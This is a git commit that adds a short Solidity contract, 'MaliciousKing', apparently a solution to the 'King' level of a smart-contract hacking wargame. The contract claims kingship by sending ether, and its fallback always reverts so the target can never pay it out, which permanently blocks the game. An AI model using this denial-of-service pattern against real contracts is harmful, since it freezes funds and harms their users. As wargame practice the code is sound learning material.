5b333d51eed5c4debc92a1afaf3c9394c26d4b25
Asamartino <a.samartino@protonmail.com>
2020-03-14 14:47:11 +0100

    Create Level9_King.sol

---
+++ Level9_King.sol
@@ -0,0 +1,14 @@
+pragma solidity ^0.6.4;
+
+contract MaliciousKing {
+
+  function kingOfKings(address addr) public payable {
+    (bool result, bytes memory data) = addr.call{value:msg.value}("");
+    if(!result) revert("The kingOfKings function reverted");
+  }
+  
+   fallback() external payable {  // fallback function that will revert everytime.
+        revert("look at me I'm the captain now");
+    }
+
+}
